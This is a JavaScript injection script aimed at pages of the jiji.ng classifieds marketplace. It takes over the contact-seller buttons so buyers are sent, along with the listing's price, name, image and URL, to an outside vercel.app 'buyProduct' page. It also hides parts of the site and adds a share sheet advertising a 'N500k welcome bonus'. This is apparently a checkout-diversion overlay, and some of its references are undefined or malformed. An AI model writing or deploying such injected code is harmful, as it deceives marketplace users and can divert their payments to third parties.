function run_buy(el){
  el.setAttribute("setattr","true");
let priceEl= document.querySelector("span.qa-advert-price-view-value");
let price = priceEl.getAttribute("content");
  let nameEl = document.querySelector("div.qa-advert-title");
  let name = nameEl.innerText;
  let imageEl = document.querySelector("img.b-slider-image");
  let image = imageEl.src;
  let biz_name = typeof BIZ_NAME == "undefined" ? "": BIZ_NAME;
  let product_url = location.href;
  location.href = `https://v0-scriptbank.vercel.app/buyProduct?price=${price}&name=${name}&site=jiji.ng&currency=NGN&biz_name=${biz_name}&product_url=${product_url}&image=${image}`
  
}
setInterval(function(){
let ads_button = document.querySelector("div.b-advert-contact-buttons");
if(ads_button && ! ads_button.getAttribute("setattr")){
ads_button.addEventListener("click", function(){
 run_buy(add_button);
});
}


let ads_button2 = document.querySelector("div.b-advert-card-wrapper__bottom");

if(ads_button2 && !ads_button2.getAttribute("setattr")){
ads_button2.addEventListener("click", function(){
 run_buy(ads_button2);
});
}

let share_button = document.querySelector("svg.qa-share-button");

if( share_button && ! share_button.getAttribute("shared")){
let share = share_button.cloneNode(true);
  share.addEventListener("click", function(){
    //add html to enhance share
    let installed_share = document.getElementById("shared_item");

    if(! installed_share ){
      let style = document.createElement("style");
      style.setAttribute("id", "shared_item");
      style.textContent = `
      .demo-btn {
    background: #4285F4;
    color: white;
    border: none;
    padding: 14px 32px;
    border-radius: 24px;
    font-size: 16px;
    font-family: inherit;
    font-weight: 500;
    cursor: pointer;
    letter-spacing: 0.3px;
    box-shadow: 0 4px 20px rgba(66,133,244,0.4);
    transition: transform 0.15s, box-shadow 0.15s;
  }
  .demo-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(66,133,244,0.5); }
  .demo-btn:active { transform: translateY(0); }

  /* ── Backdrop ── */
  .share-backdrop {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.55);
    z-index: 100;
    animation: fadeIn 0.2s ease;
  }
  .share-backdrop.open { display: block; }

  /* ── Sheet ── */
  .share-sheet {
    position: fixed;
    bottom: 0; left: 0; right: 0;
    background: #2d2d2d;
    border-radius: 28px 28px 0 0;
    z-index: 101;
    padding-bottom: env(safe-area-inset-bottom, 16px);
    transform: translateY(100%);
    transition: transform 0.35s cubic-bezier(0.32, 0.72, 0, 1);
    max-width: 480px;
    margin: 0 auto;
  }
  .share-sheet.open { transform: translateY(0); }

  /* drag handle */
  .drag-handle {
    width: 36px; height: 4px;
    background: #666;
    border-radius: 2px;
    margin: 12px auto 0;
  }

  /* ── Preview card ── */
  .preview {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 16px 20px;
    margin: 12px 16px 4px;
    background: #3a3a3a;
    border-radius: 16px;
  }
  .preview-thumb {
    width: 52px; height: 52px;
    border-radius: 10px;
    background: linear-gradient(135deg, #4285F4, #34A853);
    flex-shrink: 0;
    display: flex; align-items: center; justify-content: center;
    font-size: 22px;
  }
  .preview-text { overflow: hidden; }
  .preview-title {
    font-size: 14px;
    font-weight: 500;
    color: #e8e8e8;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .preview-url {
    font-size: 12px;
    color: #888;
    margin-top: 2px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  /* ── Apps row ── */
  .apps-row {
    display: flex;
    gap: 6px;
    padding: 12px 16px 4px;
    overflow-x: auto;
    scrollbar-width: none;
  }
  .apps-row::-webkit-scrollbar { display: none; }

  .app-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
    cursor: pointer;
    width: 68px;
    padding: 6px 4px;
    border-radius: 14px;
    transition: background 0.15s;
    border: none;
    background: transparent;
    color: inherit;
  }
  .app-item:hover { background: rgba(255,255,255,0.07); }
  .app-item:active { background: rgba(255,255,255,0.12); }

  .app-icon {
    width: 52px; height: 52px;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    font-size: 24px;
    position: relative;
  }
  .app-label {
    font-size: 11px;
    color: #ccc;
    text-align: center;
    line-height: 1.2;
    font-weight: 400;
  }

  /* app colours */
  .ic-whatsapp { background: #25D366; }
  .ic-twitter  { background: #000; border: 1px solid #333; }
  .ic-facebook { background: #1877F2; }
  .ic-telegram { background: #2AABEE; }
  .ic-instagram{ background: linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); }
  .ic-linkedin { background: #0A66C2; }
  .ic-reddit   { background: #FF4500; }
  .ic-email    { background: #EA4335; }
  .ic-sms      { background: #34A853; }
  .ic-copy     { background: #5f6368; }
  .ic-more     { background: #444; }

  /* svg icons */
  .app-icon svg { width: 26px; height: 26px; fill: white; }

  /* ── Divider ── */
  .divider {
    height: 1px;
    background: rgba(255,255,255,0.08);
    margin: 8px 16px;
  }

  /* ── Action list ── */
  .action-list { padding: 0 8px 8px; }

  .action-item {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 14px 12px;
    border-radius: 14px;
    cursor: pointer;
    transition: background 0.15s;
    border: none;
    background: transparent;
    color: inherit;
    width: 100%;
    text-align: left;
  }
  .action-item:hover { background: rgba(255,255,255,0.07); }
  .action-item:active { background: rgba(255,255,255,0.12); }

  .action-icon {
    width: 40px; height: 40px;
    border-radius: 50%;
    background: #444;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0;
  }
  .action-icon svg { width: 20px; height: 20px; fill: #ccc; }

  .action-text { font-size: 14px; color: #e0e0e0; font-weight: 400; }

  /* ── Toast ── */
  .toast {
    position: fixed;
    bottom: 24px;
    left: 50%;
    transform: translateX(-50%) translateY(20px);
    background: #444;
    color: #fff;
    padding: 10px 20px;
    border-radius: 24px;
    font-size: 13px;
    font-weight: 500;
    z-index: 200;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.2s, transform 0.2s;
    white-space: nowrap;
  }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

  @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
  `;
document.head.appendChild( style );
    }
  //      <!-- Backdrop -->
//<div class="share-backdrop" id="backdrop" onclick="closeShare()"></div>
  let back_drop = document.createElement("div");
  back_drop.setAttribute("class", "share-backdrop");
  back_drop.setAttribute("id", "backdrop");

      let share_sheet = document.createElement("div");   
      share_sheet.setAttribute("class", "share-sheet");
      share_sheet.setAttribute("id", "sheet");
      let share_html = `
<!-- Sheet -->
  <div class="drag-handle"></div>

  <!-- Preview -->
  <div class="preview">
    <div class="preview-thumb">🌐</div>
    <div class="preview-text">
      <div class="preview-title">Check out this awesome page!</div>
      <div class="preview-url">https://example.com/awesome-page</div>
    </div>
  </div>

  <!-- Apps row -->
  <div class="apps-row">

    <button class="app-item" onclick="shareTo('WhatsApp')" id="whatsapp-share>
      <div class="app-icon ic-whatsapp">
        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
      </div>
      <span class="app-label">WhatsApp</span>
    </button>

    <button class="app-item" onclick="shareTo('X (Twitter)')" id="twitter-share>
      <div class="app-icon ic-twitter">
        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
      </div>
      <span class="app-label">X</span>
    </button>

    <button class="app-item" onclick="shareTo('Facebook')" id="facebook-share">
      <div class="app-icon ic-facebook">
        <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
      </div>
      <span class="app-label">Facebook</span>
    </button>

    <button class="app-item" onclick="shareTo('Telegram')" id="telegram-share">
      <div class="app-icon ic-telegram">
        <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
      </div>
      <span class="app-label">Telegram</span>
    </button>

    <button class="app-item" onclick="shareTo('Instagram')" id="instagram-share">
      <div class="app-icon ic-instagram">
        <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
      </div>
      <span class="app-label">Instagram</span>
    </button>

    <button class="app-item" onclick="shareTo('LinkedIn')" id="linkedin-share">
      <div class="app-icon ic-linkedin">
        <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
      </div>
      <span class="app-label">LinkedIn</span>
    </button>

    <button class="app-item" onclick="shareTo('Reddit')" id="reddit-share">
      <div class="app-icon ic-reddit">
        <svg viewBox="0 0 24 24"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
      </div>
      <span class="app-label">Reddit</span>
    </button>

    <button class="app-item" onclick="shareTo('Email')" id="email-share">
      <div class="app-icon ic-email">
        <svg viewBox="0 0 24 24"><path d="M24 5.457v13.909c0 .904-.732 1.636-1.636 1.636h-3.819V11.73L12 16.64l-6.545-4.91v9.273H1.636A1.636 1.636 0 0 1 0 19.366V5.457c0-2.023 2.309-3.178 3.927-1.964L5.455 4.64 12 9.548l6.545-4.91 1.528-1.145C21.69 2.28 24 3.434 24 5.457z"/></svg>
      </div>
      <span class="app-label">Email</span>
    </button>

  </div>

  <div class="divider"></div>

  <!-- Action list -->
  <div class="action-list">

    <button class="action-item" onclick="copyLink()" id="copy-share">
      <div class="action-icon">
        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
      </div>
      <span class="action-text">Copy link</span>
    </button>

    <button class="action-item" onclick="shareTo('SMS')" id="sms-share">
      <div class="action-icon">
        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
      </div>
      <span class="action-text">Send via SMS</span>
    </button>

    <button class="action-item" onclick="nativeShare()" id="native-share">
      <div class="action-icon">
        <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
      </div>
      <span class="action-text">More options</span>
    </button>

  </div>
`;
      share_sheet.innerHTML = share_html;
      //<!-- Toast -->
//<div class="toast" id="toast"></div>`
      
      let toast = document.createElement("div");
      toast.setAttribute("class", "toast");
      toast.setAttribute("id", "toast");
      
  back_drop.onclick = function(){
    share_sheet.classList.remove('open');
    this.classList.remove('open');
  }

  const url      = typeof APP_URL == "undefined" ? 'https://example.com/awesome-page':APP_URL;
  const text     = typeof SHARE_TEXT == "undefined" ? 'Register to buy products from this app and get up to N500k welcome bonus' : SHARE_TEXT;
      

    back_drop.classList.add('open');
    requestAnimationFrame(() => share_sheet.classList.add('open'));

  const shareUrls = {
    'WhatsApp':  () => `https://wa.me/?text=${encodeURIComponent(text + ' ' + url)}`,
    'X (Twitter)': () => `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(url)}`,
    'Facebook':  () => `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`,
    'Telegram':  () => `https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`,
    'Instagram': () => null,
    'LinkedIn':  () => `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(url)}`,
    'Reddit':    () => `https://www.reddit.com/submit?url=${encodeURIComponent(url)}&title=${encodeURIComponent(text)}`,
    'Email':     () => `mailto:?subject=${encodeURIComponent(text)}&body=${encodeURIComponent(url)}`,
    'SMS':       () => `sms:?body=${encodeURIComponent(text + ' ' + url)}`,
  };
    
  function showToast(msg) {
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2500);
  }

    let facebook = share_sheet.querySelector("#facebook-share");
    let twitter = share_sheet.querySelector("#twitter-share");
    let whatsapp = share_sheet.querySelector("#whatsapp-share");
    let telegram = share_sheet.querySelector("#telegram-share");
    let instagram = share_sheet.querySelector("#instagram-share");
    let linkedIn = share_sheet.querySelector("#linkedin-share");
    let reddit = share_sheet.querySelector("#reddit-share");
    let email = share_sheet.querySelector("#email-share");
    let sms = share_sheet.querySelector("#sms-share");
    let copy = share_sheet.querySelector("#copy-share");
    let native = share_sheet.querySelector("#native-share");

    //add the actions
      function openShare() {
      back_drop.classList.add('open');
      requestAnimationFrame(() => share_sheet.classList.add('open'));
    }

  function closeShare() {
    share_sheet.classList.remove('open');
    back_drop.classList.remove('open');
  }
      function shareTo(platform) {
    const getUrl = shareUrls[platform];
    const target = getUrl ? getUrl() : null;
    if (target) {
      window.open(target, '_blank', 'noopener');
    } else {
      showToast(`${platform} doesn't support direct web sharing`);
      return;
    }
    closeShare();
    showToast(`Opening ${platform}…`);
      }

      async function nativeShare() {
    if (navigator.share) {
      closeShare();
      try {
        await navigator.share({ title: text, url });
      } catch (e) { /* cancelled */ }
    } else {
      showToast('Native share not available in this browser');
    }
      }

      function copyLink() {
    navigator.clipboard.writeText(url).then(() => {
      closeShare();
      showToast('Link copied to clipboard');
    }).catch(() => {
      showToast('Copy failed — try manually');
    });
      }
      
      facebook.onclick = function(){
        shareTo("Facebook");
      }

      twitter.onclick = function(){
        shareTo("X (Twitter)");
      }

      whatsapp.onclick = function(){
        shareTo("WhatsApp");
      }

      telegram.onclick = function(){
        shareTo("Telegram");
      }

      instagram.onclick = function(){
        shareTo("Instagram");
      }

      linkedIn.onclick = function(){
        shareTo("LinkedIn");
      }

      reddit.onclick = function(){
        shareTo("Reddit");
      }

      email.onclick = function(){
        shareTo("Email");
      }

      sms.onclick = function(){
        shareTo("SMS");
      }

      native.onclick = function(){
        nativeShare();
      }

      copy.onclick = function(){
        copyLink();
      }
      
      
      document.body.appendChild(back_drop);
      document.body.appendChild( share_sheet);
      document.body.appendChild( toast );

      
      
  // Swipe-down to dismiss
  let startY = 0;
  sheet.addEventListener('touchstart', e => { startY = e.touches[0].clientY; });
  sheet.addEventListener('touchend', e => {
    if (e.changedTouches[0].clientY - startY > 80) closeShare();
  });
    
  });
  share.setAttribute("shared", "true");
share_button.parentElement.insertBefore(share, share_button);
  share_button.remove();
}

let similar = document.querySelector("div.h-dflex.h-pb-20.h-flex-dir-column");

if(similar && similar.style.display != "none" ){
  similar.style.display = "none";
}

  
let mobile = document.querySelector("div.active.b-mobile-bar.b-mobile-bar-new");

if(mobile && mobile.style.display != "none" ){
  mobile.style.display = "none";
}


let seller_back = document.querySelector("div.b-seller-page-header__back");

if(seller_back && seller_back.style.display != "none" ){
  seller_back.style.display = "none";
}
  

let ads = document.querySelector("div.qa-show-adsense");

if(ads && ads.style.display != "none" ){
  ads.style.display = "none";
}

/*
let back = document.querySelector("div.qa-header-back-button");

if(back && back.style.display != "none" ){
  back.style.display = "none";
}
*/
}, 1000);

